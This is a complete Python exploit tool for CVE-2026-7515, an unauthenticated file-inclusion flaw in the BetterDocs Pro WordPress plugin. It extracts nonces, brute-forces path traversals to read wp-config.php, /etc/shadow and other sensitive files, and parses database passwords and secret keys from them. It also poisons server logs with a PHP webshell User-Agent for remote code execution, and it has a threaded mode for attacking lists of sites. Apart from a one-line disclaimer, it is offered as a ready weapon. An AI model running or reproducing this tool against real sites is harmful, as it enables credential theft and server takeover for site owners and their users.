#!/usr/bin/env python3
"""
CVE-2026-7515 — BetterDocs Pro <= 3.8.0
Unauthenticated Local File Inclusion via doc_style parameter
CVSS: 9.8 Critical | CWE-98
Researcher: Nguyen Ngoc Duc (duc193)
DISCLAIMER: Authorized security testing and educational purposes only.
"""

import argparse
import re
import sys
import json
import time
import threading
import queue
from pathlib import Path
from datetime import datetime

import requests
import urllib3
from rich.console  import Console
from rich.table    import Table
from rich.panel    import Panel
from rich.text     import Text
from rich.prompt   import Prompt
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# ─────────────────────────────────────────────
#  Constants
# ─────────────────────────────────────────────

AJAX_URL     = "/wp-admin/admin-ajax.php"
ACTIONS      = ["load_more_docs_section", "load_more_docs"]

# Traversal depths to try
TRAVERSALS = [
    "../../../../../../",
    "../../../../../",
    "../../../../",
    "../../../../../../../",
    "....//....//....//....//....//....//",
    "..%2F..%2F..%2F..%2F..%2F..%2F",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f",
]

# Files to attempt reading (no extension — PHP include strips .php automatically)
SENSITIVE_FILES = [
    ("wp-config",              "WordPress Config  (DB creds, secret keys)"),
    ("etc/passwd",             "Linux Users       (/etc/passwd)"),
    ("etc/shadow",             "Password Hashes   (/etc/shadow)"),
    ("proc/self/environ",      "Process Environ   (env vars, paths)"),
    ("proc/self/cmdline",      "Process Cmdline"),
    ("etc/hostname",           "Hostname"),
    ("etc/hosts",              "Hosts file"),
    ("home/www/.bash_history", "Bash History"),
    ("var/log/apache2/access.log", "Apache Access Log"),
    ("var/log/nginx/access.log",   "Nginx Access Log"),
]

# Output files
RESULTS_FILE = "betterdocs_lfi_results.txt"
_file_lock   = threading.Lock()


# ─────────────────────────────────────────────
#  Output helpers
# ─────────────────────────────────────────────

def _save(url: str, action: str, traversal: str,
          target: str, content: str) -> None:
    ts  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    sep = "=" * 70
    with _file_lock:
        with open(RESULTS_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n{sep}\n")
            f.write(f"[{ts}] LFI SUCCESS\n")
            f.write(f"URL      : {url}\n")
            f.write(f"Action   : {action}\n")
            f.write(f"Traversal: {traversal}\n")
            f.write(f"File     : {target}\n")
            f.write(f"{sep}\n")
            f.write(content.strip() + "\n")


# ─────────────────────────────────────────────
#  Step 1: Nonce extraction
# ─────────────────────────────────────────────

def fetch_nonce(base_url: str, session: requests.Session,
                timeout: int) -> str | None:
    """
    The _nonce is embedded in betterdocsEncyclopedia JS object
    on any page that renders the BetterDocs Encyclopedia block.
    We spider common pages to find it.
    """
    console.print("[cyan]🔑 Searching for encyclopedia nonce...[/cyan]")

    # Nonce patterns from betterdocs-encyclopedia.js
    patterns = [
        r"['\"]_nonce['\"]\s*:\s*['\"]([a-f0-9]{10})['\"]",
        r"encyclopedia_nonce['\"]?\s*:\s*['\"]([a-f0-9]{10})['\"]",
        r"betterdocsEncyclopedia\s*=\s*\{[^}]*['\"]_nonce['\"]\s*:\s*['\"]([a-f0-9]{10})['\"]",
        r"nonce['\"]?\s*:\s*['\"]([a-f0-9]{10})['\"]",
    ]

    # Pages to check
    check_paths = [
        "/",
        "/docs/",
        "/documentation/",
        "/knowledge-base/",
        "/encyclopedia/",
        "/help/",
        "/faq/",
        "/?page_id=2",
        "/?p=1",
    ]

    for path in check_paths:
        try:
            r = session.get(base_url.rstrip("/") + path, timeout=timeout)
            if r.status_code != 200:
                continue
            for pat in patterns:
                m = re.search(pat, r.text, re.S)
                if m:
                    nonce = m.group(1)
                    console.print(f"[green]✔ Nonce found on {path}: {nonce}[/green]")
                    return nonce
        except Exception:
            continue

    # Try WordPress REST API nonce
    try:
        r = session.get(f"{base_url}/wp-json/", timeout=timeout)
        m = re.search(r'"nonce"\s*:\s*"([a-f0-9]{10})"', r.text)
        if m:
            console.print(f"[green]✔ Nonce from REST API: {m.group(1)}[/green]")
            return m.group(1)
    except Exception:
        pass

    console.print("[yellow]⚠ Nonce not found automatically[/yellow]")
    return None


# ─────────────────────────────────────────────
#  Step 2: Verify BetterDocs is installed
# ─────────────────────────────────────────────

def verify_target(base_url: str, session: requests.Session,
                  timeout: int) -> dict:
    """Check if BetterDocs Pro is installed and get version info."""
    console.print("[cyan]🔍 Verifying BetterDocs Pro installation...[/cyan]")
    info = {"installed": False, "version": None, "vulnerable": None}

    checks = [
        "/wp-content/plugins/betterdocs-pro/readme.txt",
        "/wp-content/plugins/betterdocs/readme.txt",
        "/wp-content/plugins/betterdocs-pro/betterdocs-pro.php",
    ]

    for path in checks:
        try:
            r = session.get(base_url.rstrip("/") + path, timeout=timeout)
            if r.status_code == 200:
                info["installed"] = True
                # Extract version
                m = re.search(r"Stable tag:\s*([\d.]+)", r.text)
                if m:
                    info["version"] = m.group(1)
                    ver_parts = [int(x) for x in m.group(1).split(".")]
                    # Vulnerable if <= 3.8.0
                    info["vulnerable"] = ver_parts <= [3, 8, 0]
                console.print(
                    f"[green]✔ BetterDocs Pro found[/green] "
                    f"version=[yellow]{info['version'] or 'unknown'}[/yellow]"
                )
                break
        except Exception:
            continue

    if not info["installed"]:
        # Soft check via AJAX response
        try:
            r = session.post(
                base_url.rstrip("/") + AJAX_URL,
                data={"action": "load_more_docs_section", "_nonce": "test"},
                timeout=timeout
            )
            # BetterDocs returns specific error for invalid nonce
            if "nonce" in r.text.lower() or "betterdocs" in r.text.lower():
                info["installed"] = True
                console.print("[yellow]⚠ BetterDocs detected via AJAX response[/yellow]")
        except Exception:
            pass

    return info


# ─────────────────────────────────────────────
#  Step 3: Core LFI exploit
# ─────────────────────────────────────────────

def exploit_lfi(base_url: str, session: requests.Session,
                nonce: str, action: str, traversal: str,
                target_file: str, page: int,
                timeout: int) -> str | None:
    """
    POST to admin-ajax.php with path traversal in doc_style.
    Source: $_POST['doc_style'] → Sink: views->get("layouts/encyclopedia/$doc_style")
    No authentication required (wp_ajax_nopriv_ hook).
    """
    url  = base_url.rstrip("/") + AJAX_URL
    payload = f"{traversal}{target_file}"

    data = {
        "action":    action,
        "_nonce":    nonce,
        "doc_style": payload,
        "page":      str(page),
    }

    try:
        r = session.post(url, data=data, timeout=timeout)

        if r.status_code != 200:
            return None

        body = r.text.strip()

        # Filter out empty / error-only responses
        if not body or body in ("-1", "0", "false", "null"):
            return None

        # Filter out pure JSON error responses
        try:
            j = json.loads(body)
            if isinstance(j, dict):
                if j.get("success") is False and not j.get("data"):
                    return None
                # Content may be in data key
                if j.get("data") and isinstance(j["data"], str) and len(j["data"]) > 30:
                    return j["data"]
        except Exception:
            pass

        # Positive indicators of file content
        indicators = [
            "DB_NAME", "DB_PASSWORD", "DB_HOST", "DB_USER",   # wp-config
            "root:x:", "root:!", "nobody:",                    # /etc/passwd
            "#!/bin/",                                         # shell scripts
            "<?php",                                           # PHP files
            "define(",                                         # PHP defines
            "HTTP_HOST", "DOCUMENT_ROOT", "SERVER_ADDR",       # environ
            "[global]", "[mysqld]",                            # config files
            "127.0.0.1", "localhost",                          # hosts
        ]

        for indicator in indicators:
            if indicator in body:
                return body

        # If body is substantial and not a typical WP error
        if (len(body) > 100 and
            "wp_die" not in body and
            "Invalid nonce" not in body and
            "You do not have" not in body):
            return body

    except requests.exceptions.Timeout:
        pass
    except Exception as e:
        if "debug" in str(e).lower():
            console.print(f"[dim red]Request error: {e}[/dim red]")

    return None


# ─────────────────────────────────────────────
#  Step 4: Parse wp-config.php content
# ─────────────────────────────────────────────

def parse_wp_config(content: str) -> dict:
    """Extract key values from wp-config.php content."""
    patterns = {
        "DB_NAME":           r"define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]",
        "DB_USER":           r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]",
        "DB_PASSWORD":       r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]",
        "DB_HOST":           r"define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]",
        "table_prefix":      r"\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]",
        "AUTH_KEY":          r"define\s*\(\s*['\"]AUTH_KEY['\"]\s*,\s*['\"]([^'\"]{8,})['\"]",
        "SECURE_AUTH_KEY":   r"define\s*\(\s*['\"]SECURE_AUTH_KEY['\"]\s*,\s*['\"]([^'\"]{8,})['\"]",
        "LOGGED_IN_KEY":     r"define\s*\(\s*['\"]LOGGED_IN_KEY['\"]\s*,\s*['\"]([^'\"]{8,})['\"]",
        "WP_DEBUG":          r"define\s*\(\s*['\"]WP_DEBUG['\"]\s*,\s*(true|false)",
        "ABSPATH":           r"define\s*\(\s*['\"]ABSPATH['\"]\s*,\s*['\"]([^'\"]+)['\"]",
    }
    result = {}
    for key, pat in patterns.items():
        m = re.search(pat, content, re.S)
        if m:
            result[key] = m.group(1)
    return result


# ─────────────────────────────────────────────
#  Step 5: LFI → RCE path
# ─────────────────────────────────────────────

def lfi_to_rce_check(base_url: str, session: requests.Session,
                      nonce: str, traversal: str,
                      timeout: int) -> None:
    """
    LFI → RCE via log poisoning.
    1. Poison Apache/Nginx access log with PHP code via User-Agent
    2. Include the log file via LFI
    """
    console.print("\n[bold red]🔥 LFI → RCE: Log Poisoning Attempt[/bold red]")

    # PHP webshell payload in User-Agent
    shell_ua = "<?php system($_GET['cmd']); ?>"
    log_files = [
        ("var/log/apache2/access.log",  "Apache2 access log"),
        ("var/log/apache/access.log",   "Apache access log"),
        ("var/log/nginx/access.log",    "Nginx access log"),
        ("var/log/httpd/access_log",    "HTTPD access log"),
        ("proc/self/environ",           "Process environ"),
    ]

    # Step 1: Poison the log
    console.print("[cyan]  [1/3] Poisoning log with PHP payload in User-Agent...[/cyan]")
    try:
        poison_session = requests.Session()
        poison_session.verify = session.verify
        poison_session.headers["User-Agent"] = shell_ua
        poison_session.get(base_url, timeout=timeout)
        console.print(f"[green]  ✔ Payload sent: {shell_ua}[/green]")
    except Exception as e:
        console.print(f"[yellow]  ⚠ Poison request: {e}[/yellow]")

    time.sleep(1)

    # Step 2: Try to include log via LFI
    console.print("[cyan]  [2/3] Attempting log inclusion via LFI...[/cyan]")
    for log_file, log_name in log_files:
        for action in ACTIONS:
            content = exploit_lfi(
                base_url, session, nonce, action,
                traversal, log_file, 0, timeout
            )
            if content and "<?php" in content:
                console.print(f"[bold green]  ✔ Log included: {log_name}[/bold green]")

                # Step 3: Execute command via included shell
                console.print("[cyan]  [3/3] Executing command via poisoned log...[/cyan]")
                rce_url = (
                    f"{base_url.rstrip('/')}{AJAX_URL}"
                    f"?action={action}&cmd=id"
                )
                try:
                    r = session.post(rce_url, data={
                        "_nonce":    nonce,
                        "doc_style": f"{traversal}{log_file}",
                        "page":      "0",
                    }, timeout=timeout)
                    if r.status_code == 200:
                        console.print(Panel(
                            r.text[:500],
                            title="[bold red]💀 RCE Output[/bold red]",
                            border_style="red"
                        ))
                except Exception:
                    pass
                return

    console.print("[yellow]  ⚠ Log poisoning RCE not successful (logs may not be readable)[/yellow]")


# ─────────────────────────────────────────────
#  Single target full scan
# ─────────────────────────────────────────────

def run_scan(base_url: str, nonce: str | None, timeout: int,
             verify: bool, proxies: dict | None,
             files: list | None, try_rce: bool,
             output_file: str) -> list:
    """
    Full scan: verify → nonce → LFI all files → parse results.
    Returns list of (action, traversal, file, content) tuples.
    """
    global RESULTS_FILE
    RESULTS_FILE = output_file

    session        = requests.Session()
    session.verify = verify
    session.headers.update({
        "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/124.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    })
    if proxies:
        session.proxies = proxies

    console.print(Panel(
        Text.from_markup(
            f"[bold red]CVE-2026-7515 — BetterDocs Pro LFI[/bold red]\n"
            f"[cyan]CVSS:[/cyan] [red]9.8 Critical[/red] | "
            f"[cyan]CWE-98[/cyan] | Unauthenticated\n"
            f"[cyan]Target:[/cyan] [green]{base_url}[/green]"
        ),
        border_style="red",
        title="[bold red]🎯 Exploit[/bold red]"
    ))

    # Verify installation
    info = verify_target(base_url, session, timeout)
    if info["version"]:
        vuln_str = "[bold red]VULNERABLE[/bold red]" \
                   if info["vulnerable"] else "[green]PATCHED[/green]"
        console.print(f"    Version : [yellow]{info['version']}[/yellow] → {vuln_str}")

    # Get nonce
    if not nonce:
        nonce = fetch_nonce(base_url, session, timeout)
    if not nonce:
        console.print("[red]❌ Cannot proceed without nonce[/red]")
        console.print("[dim]Hint: Find it in page source → betterdocsEncyclopedia._nonce[/dim]")
        return []

    console.print(f"[dim]Nonce: {nonce}[/dim]\n")

    # Determine files to scan
    scan_files = files if files else SENSITIVE_FILES

    results = []
    best_traversal = None   # cache the working traversal

    for target_file, description in scan_files:
        console.print(f"[bold cyan]📄 {description}[/bold cyan]")
        found = False

        traversal_list = [best_traversal] + TRAVERSALS if best_traversal else TRAVERSALS

        for traversal in traversal_list:
            for action in ACTIONS:
                for page in [1, 0]:
                    content = exploit_lfi(
                        base_url, session, nonce,
                        action, traversal, target_file,
                        page, timeout
                    )
                    if content:
                        best_traversal = traversal
                        results.append((action, traversal, target_file, content))
                        _save(base_url, action, traversal, target_file, content)

                        # Pretty print
                        display = content
                        extra   = ""

                        # Parse wp-config specially
                        if "wp-config" in target_file and "DB_" in content:
                            parsed = parse_wp_config(content)
                            if parsed:
                                display = json.dumps(parsed, indent=2)
                                extra   = (
                                    f"\n[bold yellow]⚡ DB Credentials Extracted![/bold yellow]\n"
                                    f"  Host : [green]{parsed.get('DB_HOST','?')}[/green]\n"
                                    f"  DB   : [green]{parsed.get('DB_NAME','?')}[/green]\n"
                                    f"  User : [green]{parsed.get('DB_USER','?')}[/green]\n"
                                    f"  Pass : [bold red]{parsed.get('DB_PASSWORD','?')}[/bold red]"
                                )

                        console.print(Panel(
                            display[:2000] + ("\n[dim]...[truncated][/dim]"
                                             if len(display) > 2000 else ""),
                            title=f"[bold green]✔ {target_file}[/bold green] "
                                  f"[dim]via {action} | {traversal}[/dim]",
                            border_style="green"
                        ))
                        if extra:
                            console.print(extra)
                        console.print(f"[green]✔ Saved → {RESULTS_FILE}[/green]")
                        found = True
                        break
                if found: break
            if found: break

        if not found:
            console.print(f"  [dim red]✗ Not readable[/dim red]")

    # LFI → RCE attempt
    if try_rce and best_traversal:
        lfi_to_rce_check(base_url, session, nonce,
                         best_traversal, timeout)

    return results


# ─────────────────────────────────────────────
#  Multi-target scan
# ─────────────────────────────────────────────

class ScanStats:
    def __init__(self):
        self._lock   = threading.Lock()
        self.total   = 0
        self.checked = 0
        self.vuln    = 0
        self.errors  = 0

    def inc(self, f, n=1):
        with self._lock:
            setattr(self, f, getattr(self, f) + n)


def _multi_worker(task_q: queue.Queue, stats: ScanStats,
                  timeout: int, verify: bool, proxies: dict | None,
                  output_file: str, progress, task_id) -> None:
    while True:
        try:
            url = task_q.get_nowait()
        except queue.Empty:
            break
        try:
            url = url.strip()
            if not url or url.startswith("#"):
                stats.inc("checked"); progress.advance(task_id)
                continue
            if not url.startswith("http"):
                url = "https://" + url

            results = run_scan(
                url, None, timeout, verify, proxies,
                [("wp-config", "wp-config.php")],   # quick check
                False, output_file
            )
            if results:
                stats.inc("vuln")
                console.print(f"[bold red][VULN][/bold red] {url}")
            stats.inc("checked"); progress.advance(task_id)
        except Exception as e:
            stats.inc("errors"); stats.inc("checked"); progress.advance(task_id)
        finally:
            task_q.task_done()


def run_multiscan(targets_file: str, threads: int, timeout: int,
                  verify: bool, proxies: dict | None,
                  output_file: str) -> None:
    try:
        lines = Path(targets_file).read_text(encoding="utf-8").splitlines()
    except FileNotFoundError:
        console.print(f"[red]❌ File not found: {targets_file}[/red]"); sys.exit(1)

    urls = [l.strip() for l in lines if l.strip() and not l.startswith("#")]
    if not urls:
        console.print("[red]❌ No targets[/red]"); sys.exit(1)

    stats = ScanStats(); stats.total = len(urls)
    task_q = queue.Queue()
    for u in urls: task_q.put(u)

    console.print(f"\n[bold cyan]🔍 Multi-scan: {len(urls)} targets | {threads} threads[/bold cyan]\n")

    with Progress(SpinnerColumn(), TextColumn("{task.description}"),
                  BarColumn(), TaskProgressColumn(),
                  console=console) as progress:
        tid = progress.add_task("[cyan]Scanning...", total=len(urls))
        workers = []
        for _ in range(min(threads, len(urls))):
            t = threading.Thread(
                target=_multi_worker,
                args=(task_q, stats, timeout, verify, proxies, output_file, progress, tid),
                daemon=True
            )
            t.start(); workers.append(t)
        task_q.join()
        for t in workers: t.join()

    console.print()
    tb = Table(title="Scan Complete", border_style="cyan", show_header=False)
    tb.add_column(style="cyan", width=20); tb.add_column(style="green", width=10)
    tb.add_row("Total",      str(stats.total))
    tb.add_row("Checked",    str(stats.checked))
    tb.add_row("Vulnerable", str(stats.vuln))
    tb.add_row("Errors",     str(stats.errors))
    console.print(tb)
    console.print(f"\n[green]✔ Results → {output_file}[/green]")


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-7515 — BetterDocs Pro <= 3.8.0 LFI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  # Auto-scan single target (all sensitive files)\n"
            "  %(prog)s -u https://victim.com\n\n"
            "  # With known nonce\n"
            "  %(prog)s -u https://victim.com --nonce a1b2c3d4e5\n\n"
            "  # Read specific file\n"
            "  %(prog)s -u https://victim.com --file etc/passwd\n\n"
            "  # Full scan + RCE attempt\n"
            "  %(prog)s -u https://victim.com --rce\n\n"
            "  # Multi-target\n"
            "  %(prog)s -l targets.txt --threads 10\n"
        )
    )
    ap.add_argument("-u","--url",         help="Target WordPress URL")
    ap.add_argument("-l","--list",        help="File with target URLs")
    ap.add_argument("--nonce",            help="Known _nonce value")
    ap.add_argument("--file",             help="Specific file path to read (no extension)")
    ap.add_argument("--action",           choices=ACTIONS,
                    help="Force specific AJAX action")
    ap.add_argument("--traversal",        help="Custom traversal string")
    ap.add_argument("--rce",              action="store_true",
                    help="Attempt LFI→RCE via log poisoning")
    ap.add_argument("--threads",          type=int, default=5)
    ap.add_argument("--timeout",          type=int, default=15)
    ap.add_argument("--proxy",            help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    ap.add_argument("--no-ssl-verify",    action="store_true")
    ap.add_argument("--output",           default="betterdocs_lfi_results.txt",
                    help="Output file (default: betterdocs_lfi_results.txt)")
    ap.add_argument("--debug",            action="store_true")
    args = ap.parse_args()

    verify  = not args.no_ssl_verify
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    console.print("\n[bold white on red]  CVE-2026-7515 — BetterDocs Pro LFI  [/bold white on red]")
    console.print("[dim]  BetterDocs Pro <= 3.8.0 | Unauthenticated | CVSS 9.8[/dim]\n")

    if not args.url and not args.list:
        # Interactive mode
        console.print("[bold yellow]Interactive mode[/bold yellow]\n")
        args.url     = Prompt.ask("🔗 Target URL")
        args.nonce   = Prompt.ask("🔑 Nonce (blank=auto)", default="") or None
        args.file    = Prompt.ask("📄 File to read (blank=all)", default="") or None
        args.rce     = Prompt.ask("💀 Try RCE?", choices=["y","n"], default="n") == "y"
        args.timeout = int(Prompt.ask("⏱ Timeout", default="15"))
        prx          = Prompt.ask("🔀 Proxy (blank=skip)", default="") or None
        if prx: proxies = {"http": prx, "https": prx}

    if args.list:
        run_multiscan(args.list, args.threads, args.timeout,
                      verify, proxies, args.output)
        return

    # Build file list
    scan_files = None
    if args.file:
        scan_files = [(args.file, f"Custom: {args.file}")]
    if args.traversal:
        TRAVERSALS.insert(0, args.traversal)
    if args.action:
        ACTIONS.clear(); ACTIONS.append(args.action)

    run_scan(
        args.url, args.nonce, args.timeout,
        verify, proxies, scan_files,
        args.rce, args.output
    )


if __name__ == "__main__":
    main()
